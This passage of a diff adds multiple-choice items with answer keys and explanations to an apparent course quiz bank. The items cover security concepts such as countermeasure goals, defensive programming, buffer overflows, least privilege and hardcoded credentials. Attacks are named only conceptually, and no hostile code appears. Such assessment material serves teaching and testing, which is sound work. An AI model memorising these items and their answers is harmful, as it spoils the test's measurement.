+      "question": "In the course's terminology, the unusable platform and the losses that followed are best described as what?",
+      "options": [
+        "Threat agents",
+        "Vulnerabilities",
+        "Threat consequences — the detrimental results of a successful attack on the organization's operational security",
+        "Countermeasures"
+      ],
+      "answer": 2,
+      "explanation": "An attack is a threat that is carried out and, if successful, leads to threat consequences that are detrimental to the operational security of an organization. The outage, the refunds and the reputational harm are those consequences."
+    },
+    {
+      "topic": "Module 3 · Threats, Attacks & Threat Agents",
+      "case": "A terrorist cell outside PowerGrid Ltd floods the utility's customer-portal servers with fake requests, while a bored employee inside the control room simultaneously reads (but does not touch) files he is not cleared for.",
+      "question": "Classify BOTH incidents using the course's two attack classifications (effect on the system, and origin).",
+      "options": [
+        "Both are passive + insider",
+        "Portal flood: active + outsider. File reading: passive + insider",
+        "Portal flood: passive + insider. File reading: active + outsider",
+        "Both are active + outsider"
+      ],
+      "answer": 1,
+      "explanation": "The DoS flood modifies system resources to affect operation (active) and comes from an unauthorized external entity (outsider). The employee's silent reading uses information without affecting operation (passive) and is initiated by an authorized person inside the organization (insider)."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "After a breach, the CIO of ShopAfrica orders: 'Deploy the firewall rules, turn on the intrusion-detection alerts, and restore the site from clean backups.' The security team needs one term that covers everything being done to deal with the attack.",
+      "question": "Which term does the course use?",
+      "options": [
+        "Countermeasures — the means taken to deal with a security attack",
+        "Threat agents",
+        "Vulnerabilities",
+        "Assets"
+      ],
+      "answer": 0,
+      "explanation": "Countermeasures are defined as the means taken to deal with a security attack — covering preventive controls (firewall rules), detective controls (IDS alerts) and recovery actions (restoring from backups)."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "ShopAfrica's security team designs an input-validation layer specifically so that the SQL-injection technique used in the breach can never succeed against the new code.",
+      "question": "Which countermeasure goal does this represent?",
+      "options": [
+        "Detection — the attack is noticed while it happens",
+        "Recovery — the system is restored afterwards",
+        "Acceptance — the risk is tolerated",
+        "Prevention — ideally a countermeasure stops a particular type of attack from succeeding"
+      ],
+      "answer": 3,
+      "explanation": "The slides state that ideally a countermeasure can be devised to PREVENT a particular type of attack from succeeding. Making the injection technique impossible is prevention."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "Prevention failed for ShopAfrica: an attacker got a web shell onto the server anyway. Fortunately, the intrusion-detection system raised an alert while the attacker was still exploring the file system.",
+      "question": "Which countermeasure goal did the IDS fulfil at that moment?",
+      "options": [
+        "Recovery",
+        "Deterrence",
+        "Detection",
+        "Prevention"
+      ],
+      "answer": 2,
+      "explanation": "When prevention is not possible or fails in some instance, the goal is to DETECT the attack. The IDS alerting on live intrusion activity is detection."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "After the alert, ShopAfrica's team wiped the compromised server, restored the site from clean backups, and closed the vulnerability — returning the business to normal operation.",
+      "question": "Which stage of the countermeasure strategy was this?",
+      "options": [
+        "Enumeration",
+        "Recovery — recovering from the effects of the attack",
+        "Prevention",
+        "Detection"
+      ],
+      "answer": 1,
+      "explanation": "The slides define the sequence: ideally prevent; when prevention is not possible or fails, detect the attack, then RECOVER from the effects of the attack. Restoring from backups and closing the vulnerability is recovery."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "An external auditor asks ShopAfrica's security chief to state, in order, the goals of the countermeasure strategy when prevention fails.",
+      "question": "Which answer is correct according to the course?",
+      "options": [
+        "Prevent → Detect → Recover",
+        "Recover → Detect → Prevent",
+        "Detect → Ignore → Accept",
+        "Prevent only — nothing follows a failure"
+      ],
+      "answer": 0,
+      "explanation": "The course's guidance: ideally, prevent a particular type of attack from succeeding; when prevention is not possible or fails, the goal is to detect the attack, then recover from the effects of the attack."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "To deal with the flood of fake requests on its webshop, TechZed installs traffic-filtering appliances that identify and block the 'bad' traffic while letting legitimate customers through.",
+      "question": "In Unit-2 terms, what is this initiative an example of?",
+      "options": [
+        "A threat consequence",
+        "A threat agent",
+        "A passive attack",
+        "A countermeasure — means taken to deal with a security attack"
+      ],
+      "answer": 3,
+      "explanation": "The filtering appliances are means taken to deal with the DoS attack — that is, countermeasures. (The web-security unit adds that such DoS defences are typically located before or in the webserver, not inside the web application.)"
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "Because AirGh logged every administrative action uniquely, its security experts could isolate exactly which accounts the intruder had touched, and then tuned the intrusion-prevention system to block that attack pattern.",
+      "question": "Which security goal, working hand-in-hand with countermeasures, does this scenario illustrate?",
+      "options": [
+        "Confidentiality",
+        "Authenticity",
+        "Accountability — which enables security experts to isolate attacks and provide intrusion detection and prevention mechanisms",
+        "Availability"
+      ],
+      "answer": 2,
+      "explanation": "The slides state that accountability deters intruders from accessing the system and enables security experts to isolate attacks and provide intrusion detection and prevention mechanisms — exactly what AirGh achieved with its unique action logs."
+    },
+    {
+      "topic": "Module 4 · Countermeasures & Response",
+      "case": "Adom Online's post-incident review records: (i) a sniffer was found reading customer traffic — nothing was altered; (ii) the homepage was found defaced — content was changed. The CISO responds by ordering TLS encryption for all traffic, a file-integrity monitor on web content, and clean off-site backups.",
+      "question": "Which pairing of the CISO's diagnosis and response with course concepts is correct?",
+      "options": [
+        "(i) threat agent and (ii) threat; the responses map to accountability",
+        "(i) passive attack and (ii) active attack; the responses map to prevention (encryption blocks disclosure), detection (integrity monitor) and recovery (backups)",
+        "(i) active attack and (ii) passive attack; the responses map to recovery, prevention and detection in that order",
+        "(i) insider and (ii) outsider attacks; the responses only address availability"
+      ],
+      "answer": 1,
+      "explanation": "Sniffing that leaves the system's operation unaffected is a passive attack; defacement modifies system resources, an active attack. Encryption prevents disclosure, the integrity monitor detects changes, and backups enable recovery — the course's prevent → detect → recover countermeasure goals."
+    }
+  ],
+  "UNIT 3 — Program Security": [
+    {
+      "topic": "Module 1 · Principles of Defensive Programming",
+      "case": "The engineering team at PayMate, a mobile-money switch, is trained to write its transaction service so that it keeps functioning even while under attack: the service detects erroneous conditions caused by an attack and either keeps executing safely or fails gracefully.",
+      "question": "What is this approach to building software called?",
+      "options": [
+        "Defensive programming",
+        "Agile development",
+        "Continuous integration",
+        "Penetration testing"
+      ],
+      "answer": 0,
+      "explanation": "Defensive programming means designing and implementing software that continues to function even when under attack — it can detect erroneous conditions resulting from some attack, and decides either to continue to execute safely or to fail gracefully."
+    },
+    {
+      "topic": "Module 1 · Principles of Defensive Programming",
+      "case": "During code review at PayMate, a senior engineer keeps rejecting submissions that 'assume the config file always exists, the buffer is always big enough, and the user always types numbers.'",
+      "question": "Which key rule of defensive programming is the engineer enforcing?",
+      "options": [
+        "Trust all local input, because it comes from your own users",
+        "Optimize first; verify later if there is time",
+        "Let exceptions propagate to the operating system",
+        "Never assume anything — check all assumptions and handle any possible error states"
+      ],
+      "answer": 3,
+      "explanation": "The key rule in defensive programming is never to assume anything, but to check all assumptions and to handle any possible error states."
+    },
+    {
+      "topic": "Module 1 · Principles of Defensive Programming",
+      "case": "PayMate's transaction service reads JSON from the mobile app, applies an internal algorithm to rank transactions, calls operating-system services to persist records, and finally writes reports to a PDF queue.",
+      "question": "According to the course, which aspects of the program must secure-coding attention cover?",
+      "options": [
+        "Output formatting only",
+        "Algorithm speed and memory use only",
+        "Safe input handling, security concerns of algorithm implementation, program interaction with other components, and program output",
+        "Input handling only"
+      ],
+      "answer": 2,
+      "explanation": "A program implements an algorithm, processes inputs from different sources, interacts with operating-system services and produces results to various output media — all avenues through which vulnerabilities of insecure software may be exploited. Secure software therefore focuses on safe input handling, algorithm-implementation security, interaction with other components, and program output."
+    },
+    {
+      "topic": "Module 1 · Principles of Defensive Programming",
+      "case": "Midway through a payment batch, PayMate's database connection dies. Instead of hanging or corrupting the batch, the service logs the error, rolls the batch back, releases its resources and exits cleanly with an alert to operations.",
+      "question": "This behaviour is an example of which defensive-programming outcome?",
+      "options": [
+        "A logic error",
+        "Failing gracefully",
+        "A memory leak",
+        "A buffer overflow"
+      ],
+      "answer": 1,
+      "explanation": "Defensive programs, on detecting an erroneous condition, decide either to continue to execute safely or to fail gracefully. Rolling back and exiting cleanly — instead of hanging or corrupting state — is failing gracefully."
+    },
+    {
+      "topic": "Module 1 · Principles of Defensive Programming",
+      "case": "A junior developer asks the lead: 'When the program detects an erroneous condition that resulted from an attack, what are its two sanctioned options under defensive programming?'",
+      "question": "Which answer is correct?",
+      "options": [
+        "Continue to execute safely, or fail gracefully",
+        "Keep going at all costs, or reboot the machine",
+        "Delete the input file, or format the disk",
+        "Prompt the attacker for valid input, or escalate privileges"
+      ],
+      "answer": 0,
+      "explanation": "The slides state that defensively written software 'can detect erroneous conditions resulting from some attack, and decides either to continue to execute safely or to fail gracefully.' These are the two sanctioned outcomes."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "Reviewing PayMate's code, an auditor lists everything the program consumes: keyboard and mouse entry from staff, files on disk, data arriving over network connections, values supplied in the execution environment, configuration files, and values handed over by the operating system.",
+      "question": "Which of the following is NOT among the course's listed sources of program input?",
+      "options": [
+        "User keyboard and mouse entry",
+        "Files and network connections",
+        "Values supplied by the operating system to the program",
+        "The programmer's comments in the source code"
+      ],
+      "answer": 3,
+      "explanation": "The listed input sources are: user keyboard and mouse entry; files; network connections; data supplied to the program in the execution environment; values of configuration or other data read from files; and values supplied by the operating system. Source-code comments are never input."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "A junior developer asks why the coding standard demands that every field from the mobile app be length-checked and type-checked at the boundary, 'even though we designed the app ourselves.'",
+      "question": "What is the course's reasoning?",
+      "options": [
+        "Because compilers refuse to build programs with unchecked input",
+        "Because validation makes the code run faster",
+        "Because the value of input data is not explicitly known when the code is written, all input sources and all size/type assumptions must be identified, explicitly verified by the code, and used consistently",
+        "Because mobile apps are always malicious"
+      ],
+      "answer": 2,
+      "explanation": "Since the value of the data is not explicitly known when the code is written, all sources of input data — and any assumptions about the size and type of the values they take — have to be identified. Those assumptions must be explicitly verified by the program code, and the values used in a manner consistent with them."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "A security audit of SwiftCart, an online grocer, finds two flaws: (a) the 'delivery notes' field accepts 4,096 characters into a 256-byte buffer; (b) the delivery-date field accepts '32/13/2026' and stores it as a valid date.",
+      "question": "According to the course, which two key areas of input handling do these flaws illustrate?",
+      "options": [
+        "The language and the locale of the input",
+        "The size of the input, and the meaning and interpretation of the input",
+        "The colour and the font of the input",
+        "The speed and the timing of the input"
+      ],
+      "answer": 1,
+      "explanation": "The slides identify the two key areas where security flaws may arise from program input: (1) the SIZE of the input — here 4,096 characters into a 256-byte buffer; and (2) the MEANING AND INTERPRETATION of the input — a nonsense date accepted as valid."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "SwiftCart's promo-code field allocated a 64-byte buffer but received 120 bytes from an attacker; the excess overwrote adjacent memory and crashed the checkout service.",
+      "question": "What is the name of this input-security flaw?",
+      "options": [
+        "Buffer overflow",
+        "Memory leak",
+        "Off-by-one error",
+        "Phishing"
+      ],
+      "answer": 0,
+      "explanation": "A buffer overflow occurs when the allocated input buffer receives more input than the allocated size — exactly the 120-bytes-into-64 situation described."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "Following the promo-code incident, SwiftCart's checkout service was unavailable for two hours during the evening rush, and customers abandoned their carts in droves.",
+      "question": "According to the course, which security objective can a buffer overflow lead to violating?",
+      "options": [
+        "Confidentiality of the source code",
+        "Authenticity of the developer",
+        "Accountability of the users",
+        "System unavailability (availability)"
+      ],
+      "answer": 3,
+      "explanation": "The slides note that incorrect allocation of buffer size may lead to the input security flaw of buffer overflow, which can lead to system unavailability — a breach of availability."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "After the incident, SwiftCart's lead developer tells the team: 'From today, every field — promo codes, names, uploaded receipts, everything — is treated as hostile until proven otherwise, and we process it so that it can never put the program in danger.'",
+      "question": "Which mindset does the course say is required for writing buffer-overflow-safe code?",
+      "options": [
+        "Only validate input that has crashed the program before",
+        "Assume the network firewall has already cleaned the input",
+        "Regard ANY input as dangerous and process it in a manner that does not expose the program to danger",
+        "Regard input from registered customers as safe"
+      ],
+      "answer": 2,
+      "explanation": "Writing code that is safe against buffer overflows requires a mindset that regards any input as dangerous and processes it in a manner that does not expose the program to danger."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "SwiftCart's receipt-upload feature can receive arbitrarily large files. The team proposes two designs: (1) size the buffer dynamically so there is always enough space; (2) stream the file through a fixed-size buffer, processing it chunk by chunk.",
+      "question": "How does the course describe these two approaches?",
+      "options": [
+        "Neither design addresses input safety",
+        "They are the two approved ways of handling the SIZE of input safely: use a dynamically sized buffer to ensure sufficient space, or process the input in buffer-sized blocks",
+        "Design (1) is approved; design (2) is an anti-pattern",
+        "Both designs are memory leaks waiting to happen"
+      ],
+      "answer": 1,
+      "explanation": "With respect to the size of the input, the course gives exactly two safe strategies: either use a dynamically sized buffer to ensure that sufficient space is available, or process the input in buffer-sized blocks."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "Even after switching to dynamically sized buffers, SwiftCart crashed when a client uploaded a 500 GB 'receipt': the allocation request exceeded all available memory.",
+      "question": "What does the course require the program to do in this situation?",
+      "options": [
+        "Handle the error gracefully — e.g., process the input in blocks, discard the excess input, terminate the program, or take any other reasonable action for the abnormal situation",
+        "Let the operating system allocate swap space automatically, forever",
+        "Retry the allocation in an infinite loop until it succeeds",
+        "Nothing — such a crash is unavoidable"
+      ],
+      "answer": 0,
+      "explanation": "Even with dynamically sized buffers, care is needed to ensure the space requested does not exceed available memory. Should this occur, the program must handle the error gracefully — this may involve processing the input in blocks, discarding excess input, terminating the program, or any other reasonable action."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "The juniors added length checks only to the web checkout form. The reviewer rejects the change because the same data also arrives from the mobile app, a nightly CSV import, and a partner's API.",
+      "question": "Where must the input checks apply, according to the course?",
+      "options": [
+        "Only to web forms",
+        "Only to files read from disk",
+        "Only to inputs typed by administrators",
+        "Wherever data whose value is unknown is entered or manipulated by the program — and to all potential sources of input"
+      ],
+      "answer": 3,
+      "explanation": "The slides insist that these checks must apply wherever data whose value is unknown is entered, or is manipulated by, the program — and that they must also apply to all potential sources of input."
+    },
+    {
+      "topic": "Module 2 · Correct Input Handling & Buffer Overflows",
+      "case": "MediRecord stores each patient's age as free text. A receptionist once typed 'twenty-five'; the analytics module treated the string as a number, crashed, and corrupted the day's summary report.",
+      "question": "Which of the two key input-flaw areas does this incident fall under?",
+      "options": [
+        "The format of the output",
+        "The speed of the network",
+        "The meaning and interpretation of the input",
+        "The size of the input"
+      ],
+      "answer": 2,
+      "explanation": "The second key area is the meaning and interpretation of the input: raw data must be interpreted consistently with verified assumptions. Treating 'twenty-five' as a number without validating the interpretation is a meaning/interpretation flaw — note the string was short, so size was not the problem."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "PayMate's secure-coding checklist requires the team to verify four issues when ensuring correct program code. A new intern drafts the list and includes one item that is NOT on the course's list.",
+      "question": "Which item does not belong?",
+      "options": [
+        "Avoiding memory leakage",
+        "Choosing an attractive colour theme for the UI",
+        "Correct algorithm implementation",
+        "Correct interpretation of data values"
+      ],
+      "answer": 1,
+      "explanation": "The course lists four issues for ensuring correct program code: correct algorithm implementation; correct interpretation of data values; avoiding memory leakage; and ensuring that machine language corresponds to the algorithm. UI colour themes have nothing to do with program-code correctness."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "During a walkthrough, the team lead asks what 'correct algorithm implementation' actually requires of the payroll module being reviewed.",
+      "question": "Which answer matches the course?",
+      "options": [
+        "The high-level implementation must correctly solve the specified problem, the executed machine code must correctly represent that algorithm, and the manipulation of data values in variables, registers and memory must be valid and meaningful",
+        "The code must merely compile without errors",
+        "The code must be the shortest possible solution",
+        "The code must reuse as many libraries as possible"
+      ],
+      "answer": 0,
+      "explanation": "Ensuring correct program code means the algorithm implemented with the high-level language correctly solves the specified problem; the machine codes executed correctly represent the high-level algorithm specification; and the manipulation of data values in variables — and those stored in machine registers or memory — is valid and meaningful."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "A payroll program at AgroCorp accepted completely valid timesheet data but paid every worker double overtime, because the coded formula simply did not match the stated pay policy. The input was correct; the behaviour was not.",
+      "question": "What does the course call this kind of flaw?",
+      "options": [
+        "A buffer overflow",
+        "A syntax error",
+        "A side-channel attack",
+        "A logical (semantic) error — the program takes correct input and produces unwanted behaviour"
+      ],
+      "answer": 3,
+      "explanation": "An incorrect implementation of the algorithm by the program may lead to a vulnerability: it can cause the program to take correct input and produce an unwanted program behaviour — a logical or semantic error."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "To average two delivery fees, a developer wrote 'a+b/2'. Tests show the result is wrong whenever the numbers are odd, because the expression does not compute the intended average.",
+      "question": "Which common cause of incorrect algorithm implementation is at work?",
+      "options": [
+        "A memory leak",
+        "Misuse of environmental variables",
+        "Operator precedence — division binds tighter than addition, so a+b/2 is not (a+b)/2",
+        "An off-by-one error"
+      ],
+      "answer": 2,
+      "explanation": "The slides list operator precedence as a common cause, with exactly this example: a+b/2 is not the same as (a+b)/2, because division is evaluated before addition. The fix is explicit parentheses."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "A loop that should process array items 0 through n-1 was written as 'for (i = 0; i <= n; i++)'. On every run it touches one element beyond the end of the array, corrupting the neighbouring variable.",
+      "question": "Which common cause of implementation error is this?",
+      "options": [
+        "Memory leakage",
+        "An off-by-one error — using <= where < was required",
+        "A Boolean operation error (AND/OR confusion)",
+        "Operator precedence"
+      ],
+      "answer": 1,
+      "explanation": "The slides list the off-by-one error among common causes, illustrated as 'use < instead of <=' — choosing the wrong comparison bound. The loop's <= includes index n, one element past the end."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "A refund feature should approve a request when the user is an admin OR the original owner. The developer coded 'if (isAdmin AND isOwner)', so only admin-owners ever get refunds and ordinary owners are wrongly denied.",
+      "question": "Which common cause of incorrect algorithm implementation does this illustrate?",
+      "options": [
+        "A Boolean operation error — misuse of AND/OR",
+        "Operator precedence",
+        "An off-by-one error",
+        "A buffer overflow"
+      ],
+      "answer": 0,
+      "explanation": "The slides list Boolean operations (the use of AND, OR) among the common causes of implementation errors. Coding AND where the policy says OR inverts the intended logic."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "A program reads four bytes from a network packet. The same four bytes could legitimately be an integer, a float, or four ASCII characters — the bits alone do not say which.",
+      "question": "What does the course say about this situation?",
+      "options": [
+        "Binary data is always ASCII text by definition",
+        "The operating system interprets all data on behalf of programs",
+        "Misinterpretation of data can never cause a security flaw",
+        "The low-level representation of data values is binary stored in memory bytes, and it is left to the program to interpret the raw bits appropriately; languages vary in the capabilities they provide for restricting and validating interpretation assumptions"
+      ],
+      "answer": 3,
+      "explanation": "The slides explain that the low-level representation of data values is binary stored in memory of byte length, and it is left for the program to interpret this raw bit pattern appropriately. Different languages provide varying capabilities for restricting and validating assumptions on the interpretation of data in variables — which greatly reduces the likelihood of inappropriate manipulation introducing a flaw."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "Two teams build the same billing routine. Team A uses a strongly typed language in which a string cannot silently become a number; Team B uses untyped variables everywhere and later discovers the invoice total was silently concatenated as text.",
+      "question": "According to the course, what is the best defense against the wrong manipulation of values?",
+      "options": [
+        "Add more code comments",
+        "Print all variables to the console every hour",
+        "Use a strongly typed programming language",
+        "Use longer variable names"
+      ],
+      "answer": 2,
+      "explanation": "The slides state it directly: the best defense against the wrong manipulation of values is to use a strongly typed programming language, which restricts and validates assumptions about how data in variables may be interpreted and manipulated."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "ChatApp allocates memory on the heap for every incoming message but never releases it. Over several days the memory available on the heap steadily shrinks until the program crashes.",
+      "question": "What is this failure called?",
+      "options": [
+        "Glitching",
+        "A memory leak",
+        "A buffer overflow",
+        "An off-by-one error"
+      ],
+      "answer": 1,
+      "explanation": "If a program fails to manage dynamic memory correctly — allocating when needed and releasing when done — the consequence is a steady reduction of memory available on the heap to the point where it is completely exhausted. This is a memory leak, and the program often crashes once the available heap memory is exhausted."
+    },
+    {
+      "topic": "Module 3 · Correct Program Code: Algorithms, Data & Memory",
+      "case": "The ChatApp team argues the leak is 'only a reliability bug — we restart the app every night.' The security engineer disagrees and files it as a security finding.",
+      "question": "Why does the course treat memory leaks as security problems?",
+      "options": [
+        "Because the leak provides an obvious mechanism for an attacker to implement a denial-of-service attack on the program",
+        "Because leaks expose passwords in plain text",
+        "Because leaks always corrupt the operating-system kernel",
+        "Because leaks let attackers run arbitrary SQL"
+      ],
+      "answer": 0,
+      "explanation": "The slides note that a memory leak often makes the program crash once available heap memory is exhausted — which provides an obvious mechanism for an attacker to implement a denial-of-service attack on such a program. An attacker can deliberately trigger the exhaustion."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "PayMate's software runs on a server and constantly interacts with the operating system. The security architect wants a framework for reviewing this program–OS interaction and cites William and Lawrie (2018).",
+      "question": "Which three areas does the course (following William & Lawrie 2018) identify for addressing security in this domain?",
+      "options": [
+        "Colour schemes, fonts and icons",
+        "Database indexing, caching and sharding",
+        "Unit testing, code review and stand-ups",
+        "Proper handling of environmental variables; using appropriate, least privileges; correct use of system calls and standard library functions"
+      ],
+      "answer": 3,
+      "explanation": "The slides state that we can address security issues in program–OS interaction by looking at three areas (William and Lawrie, 2018): proper handling of environmental variables; using appropriate, least privileges; and correct use of systems calls and standard library functions."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "A new developer at PayMate sees values like PATH and TEMP appearing in the program's runtime without ever being set in its source code, and asks where they come from.",
+      "question": "How does the course define an environmental variable?",
+      "options": [
+        "A constant hard-coded in the source file",
+        "A column in the configuration database",
+        "A variable whose value is set outside the program, typically through functionality built into the operating system or microservice",
+        "A variable declared inside main()"
+      ],
+      "answer": 2,
+      "explanation": "An environmental variable is a variable whose value is set outside the program, typically through functionality built into the operating system or microservice. Environment variables affect the way programs, applications and services behave."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "On PayMate's Windows servers, the team relies on variables that define paths to executable files and libraries, store application settings and API keys, and indicate where temporary files should be stored.",
+      "question": "Which set of Windows environment-variable uses does the course list?",
+      "options": [
+        "Fonts, cursors and sound schemes",
+        "Paths (to executables, libraries and other resources); Configuration (application settings, API keys and other parameters); Temporary Files (where they should be stored)",
+        "Wallpapers, screensavers and themes",
+        "Usernames, groups and password hashes"
+      ],
+      "answer": 1,
+      "explanation": "The slides' Windows examples of environment variables are: Paths — defining paths to executable files, libraries and other resources; Configuration — storing application settings, API keys and other configuration parameters; and Temporary Files — indicating where temporary files should be stored."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "While auditing a Windows deployment script, the team checks variables such as winver, %processor_architecture% and %computername% to fingerprint the machine.",
+      "question": "According to the course, which value does %processor_architecture% return?",
+      "options": [
+        "The processor chip type",
+        "The version of Windows",
+        "The name of the computer",
+        "The amount of installed RAM"
+      ],
+      "answer": 0,
+      "explanation": "The slides list: winver — the version of Windows; %processor_architecture% — returns the processor chip type; %computername% — displays the name of the computer."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "At PayMate, the account used by the reporting service only needs to read records from the database. A former admin had granted it full administrator rights 'to make troubleshooting easier.'",
+      "question": "Which principle does this arrangement violate?",
+      "options": [
+        "The principle of open design",
+        "The principle of defense in depth",
+        "The principle of complete mediation",
+        "The principle of least privilege (PoLP) — users, applications and services should be granted only the minimum necessary permissions to perform their intended functions"
+      ],
+      "answer": 3,
+      "explanation": "The principle of least privilege dictates that users, applications and services should be granted only the minimum necessary permissions to perform their intended functions. The slides give exactly this example: a user account designed for database record retrieval shouldn't possess admin rights."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "PayMate restructures access: roles such as Teller, Auditor and Administrator are defined with specific permissions, and every user or service inherits its permissions from the role it is assigned.",
+      "question": "Which practice from the course is this, and what is one stated benefit?",
+      "options": [
+        "Secret scanning — it finds leaked credentials in source code",
+        "Buffer blocking — it prevents oversized input",
+        "Role-based access control (RBAC) — it centralizes access management and reduces the likelihood of over-privileging individual accounts",
+        "Just-in-time access — it grants privileges only for the duration of a task"
+      ],
+      "answer": 2,
+      "explanation": "The slides recommend role-based access control: define roles within your application or system and assign specific permissions to each role; users or services are then assigned to roles and inherit the associated permissions. This centralizes access management and reduces the likelihood of over-privileging individual accounts."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "For a sensitive end-of-year migration, the database administrator is granted elevated privileges at 2:00 p.m. and the system automatically revokes them the moment the migration completes at 4:00 p.m.",
+      "question": "What is this practice called?",
+      "options": [
+        "Side-channel analysis",
+        "Just-in-time (JIT) access",
+        "Permanent administrator rights",
+        "Credential stuffing"
+      ],
+      "answer": 1,
+      "explanation": "The slides describe just-in-time (JIT) access: for sensitive operations, grant elevated privileges only when — and for the duration — they are absolutely necessary; once the task is completed, automatically revoke these temporary privileges."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "A developer pushes a new build that contains the production database password written directly in the source code. The security team runs an emergency review of the risks of this habit.",
+      "question": "Which of the following is NOT one of the course's listed major security risks of hardcoding credentials?",
+      "options": [
+        "Improved application performance",
+        "Immediate exposure via source code",
+        "Brittle and difficult to rotate",
+        "Poor accountability"
+      ],
+      "answer": 0,
+      "explanation": "The slides list the major security risks with hardcoding as: immediate exposure via source code; brittle and difficult to rotate; and poor accountability. Improved performance is not a risk (nor a benefit of hardcoding credentials)."
+    },
+    {
+      "topic": "Module 4 · Secure OS Interaction: Env Vars, Least Privilege & Credentials",
+      "case": "After the hardcoded-password incident, the team wants a standard way to keep credentials out of the source tree going forward.",
+      "question": "Which combination of practices does the course recommend to prevent hardcoded credentials?",
+      "options": [
+        "Store passwords in README files, email them to the team, and print them for the office wall",
+        "Rename variables to something obscure, minify the code, and disable version control",
+        "Hardcode only in test code, rotate passwords every five years, and share one account",
+        "Use environmental variables, utilize secret managers, and automate secret scanning"
+      ],
+      "answer": 3,
+      "explanation": "The slides' 'How to prevent that' list for hardcoding: use environmental variables; utilize secret managers; and automate secret scanning. Secure credential management also includes secure configuration files — the point is to avoid hardcoding credentials within applications."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
+      "case": "During a code walkthrough, a junior asks how the Python script actually gets the OS to open a file, allocate memory or create a process.",
+      "question": "How does the course define a system call?",
+      "options": [
+        "A comment in the source code that documents behaviour",
+        "An environment variable set by the microservice",
+        "A programmatic way in which a computer program requests a service from the kernel of the operating system on which it is executed",
+        "A telephone call to the system administrator"
+      ],
+      "answer": 2,
+      "explanation": "A system call is a programmatic way in which a computer program requests a service from the kernel of the operating system on which it is executed. System calls are a way for programs to interact with the operating system and provide the OS's services to user programs."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
+      "case": "The security architect explains why system calls matter so much for security: they are the gateway between user programs and the kernel.",
+      "question": "Which property of system calls does the course emphasize?",
+      "options": [
+        "They bypass the operating system entirely",
+        "They are the only entry points into the kernel and are executed in kernel mode",
+        "They run in user mode like ordinary functions",
+        "They can be safely replaced by global variables"
+      ],
+      "answer": 1,
+      "explanation": "The slides state that system calls are the only entry points into the kernel and are executed in kernel mode. That is precisely why their correct use is a security-critical area."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
+      "case": "For a training session, the team lists what programs can request through system calls: creating and managing processes, managing main memory, file access and file-system management, device management, information maintenance and communication, and protection and networking.",
+      "question": "Which of the following is NOT among the course's listed services provided by system calls?",
+      "options": [
+        "Rendering UI animations and screen transitions",
+        "Process creation and management",
+        "Main memory management",
+        "File access, directory and file system management"
+      ],
+      "answer": 0,
+      "explanation": "The listed services are: process creation and management; main memory management; file access, directory and file system management; process control (end, abort, create, terminate, allocate and free memory); file management (create, open, close, delete, read files); device management; information maintenance & communication; and protection and networking. UI animation rendering is not on the list."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
+      "case": "The reporting module of PayMate produces PDF statements, CSV exports and JSON responses. A reviewer notes that whatever the medium, one requirement applies to all of these outputs.",
+      "question": "According to the course, what must be ensured about program output?",
+      "options": [
+        "The output must always be in PDF format",
+        "The output must be at least one gigabyte",
+        "The output must never be read by other programs",
+        "The output must really conform to the expected nature and have the desired meaning"
+      ],
+      "answer": 3,
+      "explanation": "The slides state: regardless of the types of output, the important thing is to ensure that the output really does conform to the expected nature and have the desired meaning."
+    },
+    {
+      "topic": "Module 5 · System Calls & Secure Program Output",
